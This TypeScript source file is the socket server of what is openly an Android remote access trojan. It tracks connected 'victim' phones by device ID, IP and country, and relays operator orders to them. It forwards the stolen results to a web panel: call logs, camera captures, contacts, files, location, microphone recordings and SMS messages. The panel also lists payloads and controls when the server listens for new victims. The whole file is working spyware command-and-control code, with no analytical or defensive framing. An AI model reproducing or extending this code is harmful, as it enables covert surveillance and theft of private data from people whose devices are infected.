import geoip from 'geoip-lite';
import { type Server as HTTPServer } from 'http';
import { type Server as HTTPSServer } from 'https';
import {
    type BroadcastOperator,
    type Namespace,
    Server,
    type Socket,
} from 'socket.io';
import { Inject, Service } from 'typedi';

import {
    SOCKET_NAMESPACE_DEVICE,
    SOCKET_NAMESPACE_WEB,
} from '../../common/constants';
import {
    ServerToVictimEvents,
    ServerToWebEvents,
    VictimOrder,
    VictimStatus,
    WebToServerEvents,
} from '../../common/enums';
import {
    type IServerToVictimEvents,
    type IServerToWebEvents,
    type IVictimQuery,
    type IVictimToServerEvents,
    type IWebToServerEvents,
} from '../../common/interfaces';
import { config } from '../config';
import { type VictimModel } from '../database';
import { logger } from '../logger';
import { parseDuration, parseSize } from '../utils/Common';
import { PayloadService } from './PayloadService';
import { VictimService } from './VictimService';

@Service()
export class SocketService {
    @Inject(() => PayloadService)
    private readonly payloadService!: PayloadService;

    @Inject(() => VictimService)
    private readonly victimService!: VictimService;

    private readonly io: Server<IVictimToServerEvents, IServerToVictimEvents>;
    private readonly webNS: Namespace<IWebToServerEvents, IServerToWebEvents>;
    private readonly deviceNS: Namespace;
    private _listening: boolean = false;

    public readonly payloadsRoom: BroadcastOperator<IServerToWebEvents, any>;
    public readonly victimsRoom: BroadcastOperator<IServerToWebEvents, any>;

    public get listening(): boolean {
        return this._listening;
    }

    public set listening(value: boolean) {
        this._listening = value;
        this.victimsRoom.emit(ServerToWebEvents.VICTIM_LISTENING_STATUS, value);
    }

    public constructor() {
        this.io = new Server({
            maxHttpBufferSize: parseSize(config.SOCKET_MAX_HTTP_BUFFER_SIZE),
            pingInterval: parseDuration(config.SOCKET_PING_INTERVAL),
            pingTimeout: parseDuration(config.SOCKET_PING_INTERVAL),
            allowEIO3: true,
        });
        this.webNS = this.io.of(SOCKET_NAMESPACE_WEB);
        this.deviceNS = this.io.of(SOCKET_NAMESPACE_DEVICE);
        this.payloadsRoom = this.webNS.to('payloads');
        this.victimsRoom = this.webNS.to('victims');

        this.setupListeners();
    }

    private async setupWebListeners(
        socket: Socket<IWebToServerEvents, IServerToWebEvents>,
    ): Promise<void> {
        socket.on(WebToServerEvents.LISTEN_FOR_VICTIMS, () => {
            this.victimsRoom.emit(
                ServerToWebEvents.VICTIM_LISTENING_STATUS,
                this.listenForVictims(),
            );
        });

        socket.on(WebToServerEvents.STOP_LISTENING_FOR_VICTIMS, async () => {
            this.victimsRoom.emit(
                ServerToWebEvents.VICTIM_LISTENING_STATUS,
                await this.stopListeningForVictims(),
            );
        });

        socket.on('disconnect', () => {
            logger.info('Socket disconnected for web', {
                label: 'socket',
                action: 'disconnect',
            });
        });
    }

    private async setupVictimDeviceListeners(
        victim: VictimModel,
        socket: Socket<IServerToVictimEvents, IServerToVictimEvents>,
    ): Promise<void> {
        socket.on(ServerToVictimEvents.VICTIM_ORDER, (payload) => {
            logger.verbose(
                `Received order from web for device ${victim.deviceId}`,
                {
                    label: 'socket',
                    action: 'order',
                    deviceId: victim.deviceId,
                    payload,
                },
            );

            this.io
                .to(victim.deviceId)
                .emit(ServerToVictimEvents.VICTIM_ORDER, payload);
        });

        socket.on('disconnect', () => {
            logger.info('Socket disconnected for device', {
                label: 'socket',
                action: 'disconnect',
                deviceId: victim.deviceId,
            });
        });
    }

    private async setupVictimListeners(
        socket: Socket<IVictimToServerEvents, IServerToVictimEvents>,
    ): Promise<void> {
        const query = socket.handshake.query as unknown as IVictimQuery;
        const deviceId = query.id;

        await socket.join('victim');
        await socket.join(deviceId);

        const ip = socket.conn.remoteAddress.substring(
            socket.conn.remoteAddress.lastIndexOf(':') + 1,
        );
        const country: string | null = geoip.lookup(ip)?.country ?? 'Unknown';

        logger.info('New victim device connected', {
            label: 'socket',
            action: 'connection',
            query,
            country,
            ip,
        });

        try {
            const victim = await this.victimService.addOrUpdate(
                deviceId,
                ip,
                socket.request.socket.remotePort ?? 0,
                country,
                query.manf,
                query.model,
                query.release,
            );

            this.victimsRoom.emit(ServerToWebEvents.VICTIM_CONNECTED, victim);
        } catch (error) {
            logger.error('Failed to add or update victim', {
                label: 'socket',
                action: 'connection',
                error,
            });
        }

        socket.on(VictimOrder.CALLS, (data) => {
            logger.info("Received data for calls order from victim's device", {
                label: 'socket',
                action: 'order',
                deviceId,
                data,
            });

            this.deviceNS.to(deviceId).emit(VictimOrder.CALLS, data);
        });

        socket.on(VictimOrder.CAMERA, (data) => {
            const { buffer, ...filteredData } = data;
            logger.info("Received data for camera order from victim's device", {
                label: 'socket',
                action: 'order',
                deviceId,
                data: filteredData,
            });

            this.deviceNS.to(deviceId).emit(VictimOrder.CAMERA, data);
        });

        socket.on(VictimOrder.CONTACTS, (data) => {
            logger.info(
                "Received data for contacts order from victim's device",
                {
                    label: 'socket',
                    action: 'order',
                    deviceId,
                    data,
                },
            );

            this.deviceNS.to(deviceId).emit(VictimOrder.CONTACTS, data);
        });

        socket.on(VictimOrder.FILE_MANAGER, (data) => {
            let filteredData: unknown;

            if (Array.isArray(data)) {
                filteredData = data;
            } else if (data.file) {
                const { buffer, ...rest } = data;
                filteredData = rest;
            }

            logger.info(
                "Received data for file manager order from victim's device",
                {
                    label: 'socket',
                    action: 'order',
                    deviceId,
                    data: filteredData,
                },
            );

            this.deviceNS.to(deviceId).emit(VictimOrder.FILE_MANAGER, data);
        });

        socket.on(VictimOrder.LOCATION, (data) => {
            logger.info(
                "Received data for location order from victim's device",
                {
                    label: 'socket',
                    action: 'order',
                    deviceId,
                    data,
                },
            );

            this.deviceNS.to(deviceId).emit(VictimOrder.LOCATION, data);
        });

        socket.on(VictimOrder.MICROPHONE, (data) => {
            logger.info(
                "Received data for microphone order from victim's device",
                {
                    label: 'socket',
                    action: 'order',
                    deviceId,
                    data,
                },
            );

            this.deviceNS.to(deviceId).emit(VictimOrder.MICROPHONE, data);
        });

        socket.on(VictimOrder.SMS, (data) => {
            logger.info("Received data for SMS order from victim's device", {
                label: 'socket',
                action: 'order',
                deviceId,
                data,
            });

            this.deviceNS.to(deviceId).emit(VictimOrder.SMS, data);
        });

        socket.on('disconnect', async () => {
            logger.info(`Socket disconnected for victim '${deviceId}'`, {
                label: 'socket',
                action: 'disconnect',
                deviceId,
            });

            try {
                const victim = await this.victimService.updateStatus(
                    deviceId,
                    VictimStatus.DISCONNECTED,
                );

                this.victimsRoom.emit(
                    ServerToWebEvents.VICTIM_DISCONNECTED,
                    victim,
                );
            } catch (error) {
                logger.error('Failed to update victim status', {
                    label: 'socket',
                    action: 'disconnect',
                    error,
                });
            }

            this.deviceNS.to(deviceId).disconnectSockets(true);
        });
    }

    private setupListeners(): void {
        this.io.on('connection', async (socket: Socket) => {
            if (
                typeof socket.handshake.query?.id !== 'string' ||
                socket.handshake.query.id.length === 0
            ) {
                logger.warn('Socket connection rejected', {
                    label: 'socket',
                    action: 'connection',
                    query: socket.handshake.query,
                });
                socket.disconnect();
                return;
            }

            logger.info('Received socket connection from victim', {
                label: 'socket',
                action: 'connection',
            });

            this.setupVictimListeners(socket).catch((error) => {
                logger.error('Failed to handle socket connection for victim!', {
                    label: 'socket',
                    action: 'connection',
                    error,
                });
            });
        });

        this.webNS.on('connection', async (socket: Socket) => {
            logger.info('Received socket connection from web', {
                label: 'socket',
                action: 'connection',
            });

            // TODO: Add authentication for web socket connections
            if (
                socket.handshake.query?.page !== 'payloads' &&
                socket.handshake.query?.page !== 'victims'
            ) {
                logger.warn('Socket connection for web rejected', {
                    label: 'socket',
                    action: 'connection',
                    query: socket.handshake.query,
                });
                socket.disconnect();
                return;
            }

            if (socket.handshake.query?.page === 'payloads') {
                await socket.join('payloads');

                const payloads = await this.payloadService.list();
                socket.emit(ServerToWebEvents.PAYLOAD_LIST, payloads);
            } else if (socket.handshake.query?.page === 'victims') {
                await socket.join('victims');

                socket.emit(
                    ServerToWebEvents.VICTIM_LISTENING_STATUS,
                    this.listening,
                );
            }

            this.setupWebListeners(socket).catch((error) => {
                logger.error('Failed to handle socket connection for web!', {
                    label: 'socket',
                    action: 'connection',
                    error,
                });
            });
        });

        this.deviceNS.on('connection', async (socket: Socket) => {
            let victim: VictimModel | null = null;

            if (
                typeof socket.handshake.query?.deviceId !== 'string' ||
                socket.handshake.query.deviceId.length === 0 ||
                (victim = await this.victimService.findByDeviceId(
                    socket.handshake.query.deviceId,
                )) === null
            ) {
                logger.warn('Socket connection rejected', {
                    label: 'socket',
                    action: 'connection',
                    query: socket.handshake.query,
                });
                socket.disconnect();
                return;
            }

            await socket.join(victim.deviceId);

            logger.info('Received socket connection for device', {
                label: 'socket',
                action: 'connection',
            });

            this.setupVictimDeviceListeners(victim, socket).catch((error) => {
                logger.error('Failed to handle socket connection for device!', {
                    label: 'socket',
                    action: 'connection',
                    error,
                });
            });
        });
    }

    private listenForVictims(): boolean {
        logger.verbose("Starting socket server's listening for victims", {
            label: 'socket',
            action: 'connection',
        });

        if (this.listening) {
            logger.warn(
                "Socket server's listening for victims is already started",
                {
                    label: 'socket',
                    action: 'connection',
                },
            );
            return true;
        }

        try {
            this.io.listen(config.SOCKET_PORT);

            this.listening = true;
            logger.info(
                `Started socket server's listening for victims on port ${config.SOCKET_PORT}`,
                {
                    label: 'socket',
                    action: 'connection',
                },
            );
        } catch (error) {
            logger.error(
                "Failed to start socket server's listening for victims",
                {
                    label: 'socket',
                    action: 'connection',
                    error,
                },
            );
        }

        return this.listening;
    }

    private async stopListeningForVictims(): Promise<boolean> {
        logger.verbose("Stopping socket server's listening for victims", {
            label: 'socket',
            action: 'connection',
        });

        return await new Promise((resolve) => {
            this.io.close((err) => {
                if (err !== undefined) {
                    logger.error(
                        "Failed to stop socket server's listening for victims",
                        {
                            label: 'socket',
                            action: 'connection',
                            error: err,
                        },
                    );
                } else {
                    logger.info(
                        "Stopped socket server's listening for victims",
                        {
                            label: 'socket',
                            action: 'connection',
                        },
                    );
                }

                resolve((this.listening = false));
            });
        });
    }

    public attach(server: HTTPServer | HTTPSServer): void {
        this.io.attach(server);
    }
}
